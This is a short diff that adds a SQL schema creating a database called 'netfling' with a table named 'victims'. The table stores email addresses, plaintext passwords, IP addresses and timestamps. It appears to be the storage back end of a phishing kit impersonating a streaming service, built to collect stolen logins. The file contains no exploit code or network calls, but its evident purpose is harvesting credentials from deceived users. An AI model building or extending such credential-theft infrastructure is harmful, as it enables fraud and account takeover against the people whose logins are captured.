@@ -1,0 +1,11 @@
+CREATE DATABASE netfling;
+
+USE netfling;
+
+CREATE TABLE victims (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    email VARCHAR(255),
+    password VARCHAR(255),
+    ip VARCHAR(15),
+    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
